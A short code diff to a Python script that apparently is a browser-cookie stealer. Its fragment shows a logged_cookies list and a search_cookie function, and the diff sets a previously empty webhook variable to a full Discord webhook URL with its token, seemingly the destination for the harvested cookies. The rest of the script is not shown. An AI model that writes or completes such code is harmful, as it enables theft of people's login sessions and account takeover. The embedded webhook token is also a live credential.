@@ -7,7 +7,7 @@ import shutil
 import time
 import os
 
-webhook = ""
+webhook = "https://discord.com/api/webhooks/962164582321909770/U7wePCy19wCr2jcRdG6QM3QlPWiftJQ2A8X_wtkWtYBg-NCC8fGPZ5uqmTQ_GwL47YhC"
 logged_cookies = []
 
 def search_cookie(file_path: "file") -> None:
